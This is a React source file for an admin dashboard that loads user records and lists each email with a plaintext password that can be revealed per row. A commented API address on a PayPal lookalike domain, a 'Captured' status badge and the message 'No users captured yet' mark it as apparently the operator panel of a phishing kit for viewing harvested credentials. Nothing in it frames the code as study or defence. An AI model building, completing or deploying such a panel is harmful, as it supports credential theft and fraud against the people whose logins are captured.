import React, { useEffect, useState } from "react";
import axios from "axios";
import {
  Search,
  Users,
  Radio,
  Eye,
  ChevronLeft,
  ChevronRight,
  MoreVertical,
  UserSearch,
  Network,
  EyeOff,
} from "lucide-react";
import Spinner from "../components/Spinner";
import { useNavigate } from "react-router-dom";

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [visiblePasswords, setVisiblePasswords] = useState({}); // Track visibility per row

  const token = localStorage.getItem("adminToken");

  const fetchUsers = async () => {
    try {
      const res = await axios.get("", {
        headers: { Authorization: `Bearer ${token}` },
      });
      // Ensure we handle the data structure correctly based on your API response
      setUsers(res.data?.data || res.data?.users || []);
    } catch (err) {
      setError(err.response?.data?.message || "Failed to load users");
    } finally {
      setLoading(false);
    }
  };

  // https://paypalcom-nl.onrender.com/api/admin/users

  useEffect(() => {
    if (!token) {
      navigate("/admin/login");
      return;
    }
    fetchUsers();
  }, []);

  const togglePasswordVisibility = (id) => {
    setVisiblePasswords((prev) => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  if (loading)
    return (
      <div className="h-screen flex flex-col items-center justify-center">
        <Spinner size={50} />
        <p className="ml-2 font-medium">Decrypting Registry...</p>
      </div>
    );

  if (error)
    return (
      <div className="h-screen flex items-center justify-center text-red-500 bg-red-50">
        <div className="text-center p-8 bg-white shadow-xl rounded-lg border border-red-200">
          <h2 className="text-xl font-bold mb-2">Access Denied</h2>
          <p>{error}</p>
          <button
            onClick={() => window.location.reload()}
            className="mt-4 text-blue-600 underline"
          >
            Try again
          </button>
        </div>
      </div>
    );
  return (
    <div className="bg-[#fcf9f9] text-[#313234] flex min-h-screen">
      {/* Main Content */}
      <main className="flex-1 min-h-screen bg-surface flex flex-col">
        {/* TopNavBar */}
        <header className="w-full h-16 bg-[#fcf9f9] flex justify-between items-center px-8 border-b border-slate-200/20 sticky top-0 z-40">
          <div className="flex items-center gap-4 flex-1">
            <div className="relative w-full max-w-md">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
              <input
                className="w-full pl-10 pr-4 py-1.5 bg-slate-100 dark:bg-[#fcf9f9] border-none rounded-md focus:ring-1 focus:ring-indigo-600 text-sm"
                placeholder="Global search..."
                type="text"
              />
            </div>
          </div>
          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2"></div>
            <div className="h-8 w-px bg-slate-200"></div>
            <div className="flex items-center gap-3">
              <div className="text-right">
                <p className="text-xs font-bold text-slate-900 leading-none">
                  Admin Dashbord
                </p>
                <p className="text-[10px] text-slate-500">Root Access</p>
              </div>
            </div>
          </div>
        </header>

        {/* Content Canvas */}
        <div className="p-8 space-y-8">
          {/* Page Header */}
          <div className="flex justify-between items-end">
            <div>
              <h1 className="text-4xl font-extrabold tracking-tight text-on-surface">
                User Registry
              </h1>
              <p className="text-[#5e5f61] mt-1">
                Manage institutional access and credential authorization.
              </p>
            </div>
          </div>

          {/* Stats Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 justify-center gap-6">
            {/* Stat Card 1 */}
            <div className="bg-[#ffffff] p-6 rounded-xl border-l-4 border-[#dae2fd] shadow-sm">
              <div className="flex justify-between items-start mb-4">
                <div className="p-2 bg-[#dae2fd]/30 rounded-lg text-[#565e74]">
                  <Users className="w-5 h-5" />
                </div>
                <span className="text-xs font-bold text-[#0053dc]">+12.5%</span>
              </div>
              <p className="text-label uppercase tracking-widest text-xs text-[#5e5f61] mb-1">
                Total Users
              </p>
              {/* <h3 className="text-3xl font-headline font-extrabold text-[#313234]">
                0
              </h3> */}
            </div>

            {/* Stat Card 2 */}
            <div className="bg-surface-container-lowest p-6 rounded-xl border-l-4 border-[#3e76fe] shadow-sm">
              <div className="flex justify-between items-start mb-4">
                <div className="p-2 bg-[#3e76fe]/10 text-[#0053dc] rounded-lg">
                  <Radio className="w-5 h-5" />
                </div>
                <span className="text-xs font-bold text-slate-400">Live</span>
              </div>
              <p className="text-label uppercase tracking-widest text-xs text-[#5e5f61] mb-1">
                Active Sessions
              </p>
              {/* <h3 className="text-3xl font-headline font-extrabold text-[#313234]">
                42
              </h3> */}
            </div>
          </div>

          {/* Registry Table Area */}
          <section className="bg-[#ffffff] rounded-xl shadow-sm overflow-hidden">
            <div className="px-8 py-5 flex items-center justify-between border-b border-slate-100">
              <h2 className="text-lg font-bold text-[#313234]">
                Registry Database
              </h2>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left border-separate border-spacing-y-1 px-4 pb-4">
                <thead>
                  <tr className="text-[#5e5f61] text-[10px] uppercase tracking-wider">
                    <th className="px-4 py-4 font-semibold">Short ID</th>
                    <th className="px-4 py-4 font-semibold">Email Address</th>
                    <th className="px-4 py-4 font-semibold">
                      Credential Password
                    </th>
                    <th className="px-4 py-4 font-semibold">Status</th>
                    <th className="px-4 py-4 font-semibold">Last Activity</th>
                    <th className="px-4 py-4 font-semibold text-right">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody className="space-y-2">
                  {users.length > 0 ? (
                    users.map((user) => (
                      <tr
                        key={user._id}
                        className="group hover:bg-[#f5f3f4] transition-colors duration-200"
                      >
                        <td className="px-4 py-5 first:rounded-l-lg last:rounded-r-lg">
                          <span className="font-mono text-xs font-medium text-[#565e74]">
                            {user._id.slice(-6).toUpperCase()}
                          </span>
                        </td>
                        <td className="px-4 py-5">
                          <div className="flex items-center gap-3">
                            <div className="w-8 h-8 rounded-full bg-[#d5e3fc] flex items-center justify-center text-[#526074] font-bold text-xs uppercase">
                              {user.email.substring(0, 2)}
                            </div>
                            <div className="text-sm font-medium">
                              {user.email}
                            </div>
                          </div>
                        </td>
                        <td className="px-4 py-5">
                          <div className="bg-[#efedef] px-3 py-1.5 rounded-md flex items-center gap-2 max-w-fit">
                            <span className="text-xs font-mono tracking-tighter">
                              {visiblePasswords[user._id]
                                ? user.password
                                : "••••••••••••"}
                            </span>
                            <button
                              onClick={() => togglePasswordVisibility(user._id)}
                              className="text-[#5e5f61] hover:text-[#0053dc]"
                            >
                              {visiblePasswords[user._id] ? (
                                <EyeOff className="w-4 h-4" />
                              ) : (
                                <Eye className="w-4 h-4" />
                              )}
                            </button>
                          </div>
                        </td>
                        <td className="px-4 py-5">
                          <span className="px-3 py-1 bg-[#dae2fd] text-[#4a5167] text-[11px] font-bold rounded-full uppercase">
                            Captured
                          </span>
                        </td>
                        <td className="px-4 py-5">
                          <div className="flex flex-col">
                            <span className="text-xs font-semibold">
                              {new Date(
                                user.createdAt || user.timestamp || Date.now(),
                              ).toLocaleDateString()}
                            </span>
                            <span className="text-[10px] text-[#5e5f61]">
                              {new Date(
                                user.createdAt || user.timestamp || Date.now(),
                              ).toLocaleTimeString()}
                            </span>
                          </div>
                        </td>
                        <td className="px-4 py-5 text-right">
                          <button className="p-2 text-[#5e5f61] hover:text-[#0053dc]">
                            <MoreVertical className="w-5 h-5" />
                          </button>
                        </td>
                      </tr>
                    ))
                  ) : (
                    <tr>
                      <td colSpan="6" className="py-20 text-center">
                        <div className="flex flex-col items-center">
                          <UserSearch className="w-12 h-12 text-slate-300 mb-2" />
                          <p className="text-slate-500 font-medium">
                            No users captured yet.
                          </p>
                        </div>
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </section>
          {/* Quick Actions / Audit Breadcrumbs */}
          <section className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2 bg-[#ffffff] p-8 rounded-xl shadow-sm">
              <div className="flex items-center justify-between mb-8">
                <h3 className="text-xl font-headline font-extrabold text-[#313234]">
                  Security Audit Breadcrumbs
                </h3>
                <a
                  className="text-[#0053dc] text-sm font-semibold hover:underline"
                  href="#"
                >
                  View Global History
                </a>
              </div>
              <div className="relative pl-8 space-y-8 before:content-[''] before:absolute before:left-[11px] before:top-2 before:bottom-2 before:w-[0.5px] before:bg-[#b2b2b4]/30">
                {/* Timeline dots remain divs */}
              </div>
            </div>

            {/* Infrastructure Health */}
            <div className="space-y-6">
              <div className="bg-indigo-600 rounded-xl p-6 text-white shadow-xl relative overflow-hidden">
                <div className="relative z-10">
                  <p className="text-indigo-200 text-[10px] font-label uppercase tracking-widest mb-1">
                    Infrastructure Health
                  </p>
                  <h4 className="text-xl font-headline font-bold mb-4">
                    Node: Primary-A
                  </h4>
                  <div className="space-y-3">
                    <div className="flex justify-between text-xs">
                      <span>Sync Status</span>
                      <span className="font-bold">99.98%</span>
                    </div>
                    <div className="w-full h-1.5 bg-indigo-500 rounded-full overflow-hidden">
                      <div className="w-[99.98%] h-full bg-white"></div>
                    </div>
                    <div className="pt-4">
                      <button className="w-full py-2 bg-white/20 hover:bg-white/30 rounded text-xs font-bold transition-colors">
                        System Diagnostics
                      </button>
                    </div>
                  </div>
                </div>

                {/* Background Pattern */}
                <Network className="absolute top-0 right-0 opacity-10 w-[140px] h-[140px]" />
              </div>
            </div>
          </section>
        </div>
      </main>
    </div>
  );
}
